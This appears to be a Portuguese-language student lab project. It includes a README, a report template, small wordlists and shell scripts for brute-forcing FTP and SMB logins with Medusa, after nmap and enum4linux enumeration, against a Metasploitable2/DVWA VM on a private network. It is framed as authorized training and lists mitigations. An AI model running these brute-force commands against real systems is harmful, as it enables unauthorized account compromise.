# Projeto: Ataques de Força Bruta com Medusa (Kali + Metasploitable2/DVWA)



## Estrutura de arquivos (já preparadas abaixo)

```
desafio-medusa-kali/
├─ README.md
├─ relatorio.md
├─ wordlists/
│  ├─ simples_usernames.txt
│  └─ simples_passwords.txt
├─ scripts/
│  ├─ run_medusa.sh
│  └─ collect_evidence.sh
├─ images/
│  └─ (coloque suas screenshots aqui)
└─ commands.txt
```

---

<!-- README.md -->

````markdown
# Desafio: Ataques de Força Bruta com Medusa (Kali + Metasploitable2/DVWA)

## Resumo
Projeto para demonstrar ataques de força bruta em ambiente controlado usando Kali Linux e Medusa, com alvo Metasploitable2 e DVWA. Objetivo: aprender enumeração, execução de ataques e recomendações de mitigação.

> **Aviso legal:** Todos os testes foram executados apenas em VMs de laboratório (Metasploitable2 / DVWA). Não realize testes em sistemas sem autorização.

## Estrutura do repositório
- `README.md` (este arquivo)
- `relatorio.md` (relatório técnico com evidências)
- `wordlists/` (wordlists usadas nos testes)
- `scripts/` (scripts para rodar os testes e coletar evidências)
- `images/` (screenshots e capturas de pcap)
- `commands.txt` (comandos executados)

## Ambiente
- Hypervisor: VirtualBox
- VMs:
  - Kali Linux (autor: Marcelo) — IP: `192.168.1.2` (exemplo)
  - Metasploitable2 — IP: `192.168.1.16` (exemplo)
- Rede: Host-only / Internal Network

> Substitua os IPs acima pelos IPs reais do seu ambiente antes de executar os scripts.

## Ferramentas utilizadas
- Kali Linux
- Medusa
- Nmap
- smbclient, enum4linux
- Hydra (opcional)
- ssh/sshfs

## Wordlists (exemplo)
Veja a pasta `wordlists/` neste repositório.

## Comandos principais (exemplos)
### Enumeração
```bash
sudo nmap -sS -sV -p- 192.168.1.16 -oN nmap_full.txt
smbclient -L //192.168.1.16 -N
enum4linux -a 192.168.1.16 > enum4linux.txt
````

### Ataque FTP (Medusa)

```bash
medusa -h 192.168.1.16 -u msfadmin -P wordlists/simples_passwords.txt -M ftp -t 4 -f -o medusa_ftp_results.txt
```

### Ataque SMB (Medusa)

```bash
medusa -h 192.168.1.16 -U wordlists/simples_usernames.txt -P wordlists/simples_passwords.txt -M smb -t 8 -f -o medusa_smb_results.txt
```




## Resultado e recomendações

Documente no `relatorio.md` os logins encontrados, horários, comandos e recomendações de mitigação (políticas de senha, bloqueio de conta, MFA, não expor SMB/FTP, usar SFTP/FTPS, monitoramento).

````

---

<!-- relatorio.md -->

```markdown
# Relatório Técnico — Desafio Medusa (Kali + Metasploitable2/DVWA)

## Autor
Marcelo Guilherme

## Data
2025-10-28

## Resumo executivo
(Coloque aqui um resumo curto: objetivos, ambiente e principais resultados.)

## Ambiente
- Kali Linux — IP: 192.168.1.2
- Metasploitable2 — IP: 192.168.1.16
- Rede: Host-only

## Objetivos do teste
1. Executar ataques de força bruta com Medusa contra FTP.
2. Realizar password spraying em SMB.
3. Simular tentativas em formulário web (DVWA).
4. Documentar evidências e propor medidas de mitigação.

## Metodologia
(Descreva a sequência: enumeração → ataque com Medusa → validação → coleta de evidências.)

## Wordlists usadas
- `wordlists/simples_usernames.txt`
- `wordlists/simples_passwords.txt`

## Comandos executados e saídas relevantes
(Colar trechos das saídas dos arquivos em `commands.txt` e `medusa_*_results.txt`.)

## Evidências (screenshots)
- `images/nmap_full.png` — resultado do Nmap
- `images/medusa_ftp.png` — saída do Medusa mostrando credenciais
- `images/dvwa_login.png` — tentativa de login no DVWA

## Resultados
- FTP: `msfadmin:msfadmin` (exemplo) — [timestamp]
- SMB: (detalhar se obteve algo)

## Impacto
(Explique o risco caso essas senhas fossem em produção.)

## Recomendações de mitigação
- Políticas de senha e bloqueio de conta
- MFA
- Não expor serviços (SMB/FTP) à Internet
- Usar SFTP/FTPS e criptografia
- Monitoramento e alertas

## Conclusão
(Reflexão final sobre o exercício e próximos passos para aprofundar.)
````

---

<!-- wordlists/simples_usernames.txt -->

```
admin
msfadmin
user
test
guest
```

---

<!-- wordlists/simples_passwords.txt -->

```
password
123456
admin
pass
msfadmin
qwerty
```

---

<!-- scripts/run_medusa.sh -->

```bash
#!/bin/bash
# Script simples para executar os testes de Medusa em um alvo local.
# Uso: sudo ./run_medusa.sh 192.168.1.16

if [ -z "$1" ]; then
  echo "Uso: $0 <IP_ALVO>"
  exit 1
fi
TARGET="$1"
WORD_USERS="wordlists/simples_usernames.txt"
WORD_PASS="wordlists/simples_passwords.txt"
OUTDIR="results"
mkdir -p "$OUTDIR"

echo "==> Nmap quick"
sudo nmap -sV -p 21,22,80,139,445,3306 "$TARGET" -oN "$OUTDIR/nmap_quick.txt"

echo "==> Medusa FTP"
medusa -h "$TARGET" -U "$WORD_USERS" -P "$WORD_PASS" -M ftp -t 6 -f -O "$OUTDIR/medusa_ftp.txt"

echo "==> Medusa SMB"
medusa -h "$TARGET" -U "$WORD_USERS" -P "$WORD_PASS" -M smb -t 8 -f -O "$OUTDIR/medusa_smb.txt"

echo "==> done. results in $OUTDIR"
```

> Torne o script executável: `chmod +x scripts/run_medusa.sh`

---

<!-- scripts/collect_evidence.sh -->

```bash
#!/bin/bash
# Coleta evidências rápidas: outputs do medusa, smbclient e captura com tcpdump (opcional)
TARGET="$1"
OUTDIR="results"
mkdir -p "$OUTDIR"

if [ -z "$TARGET" ]; then
  echo "Uso: $0 <IP_ALVO>"
  exit 1
fi

# listar shares (sem senha)
smbclient -L "//$TARGET" -N > "$OUTDIR/smb_shares.txt" 2>&1

# salvar conexões ativas (netstat) em host local
ss -tulpen > "$OUTDIR/ss.txt"

# opcional: tcpdump por 10s (requer sudo)
# sudo timeout 10 tcpdump -i any host $TARGET -w "$OUTDIR/capture.pcap"

echo "evidences saved in $OUTDIR"
```

---

<!-- commands.txt -->

```
# Comandos executados (cole as saídas relevantes no relatorio.md)
sudo nmap -sS -sV -p- 192.168.1.16 -oN nmap_full.txt
smbclient -L //192.168.1.16 -N
enum4linux -a 192.168.1.16 > enum4linux.txt
medusa -h 192.168.1.16 -u msfadmin -P wordlists/simples_passwords.txt -M ftp -t 4 -f
medusa -h 192.168.1.16 -U wordlists/simples_usernames.txt -P wordlists/simples_passwords.txt -M smb -t 8 -f
```

---


